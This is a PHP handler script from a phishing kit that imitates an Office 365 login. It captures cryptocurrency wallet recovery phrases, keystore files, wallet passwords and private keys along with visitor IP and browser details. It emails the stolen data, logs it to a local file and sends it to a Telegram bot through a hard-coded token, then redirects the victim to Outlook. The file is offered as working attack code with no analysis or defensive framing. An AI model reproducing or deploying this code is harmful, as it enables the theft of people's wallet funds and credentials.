<?php

include('email2.php');
include("system.php"); 
include("detect.php"); 

$ip = $_SERVER['REMOTE_ADDR'];
$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	



$subject = "OFFICE 365 Login Infos ";
$headers = "From: BD <OFFICE 365>\r\n";
$message .= "


[+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = ".$ip."
[USER AGENT] = ".$UserAgent."
[⏰ TIME/DATE] = ".$InfoDATE."
[🌐 BROWSER] = ".$browserTy_Version." and ".$OS."

[WALLET NAME] : ".$_SESSION['phrase']."
[PHRASE RECOVERY NUMBER] = ".$_POST['phrase']."
[KEYSTORE JSON] = ".$_POST['keystoreval']."
[WALLET PASSWORD] = ".$_POST['keystorepass']."
[PRIVATE KEY] = ".$_POST['privatekeyval']."

----------------------------------\n
**********************************\n
**********************************\n";
mail($email,$subject,$message,$headers);
$text = fopen('stored.txt', 'a');
$send = "systemupdate546@gmail.com,unicornhak4@gmail.com";
fwrite($text, $message);

/* Telegram */
function sendMessage($messaggio) {
    $token = '7052759807:AAEuOXrrhrCSGHVZu1dNZBSIMoIVXmZ_HDM';
	$chatid = '6687721863';
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
sendMessage($message);
header("Location: https://www.outlook.com/");

?>
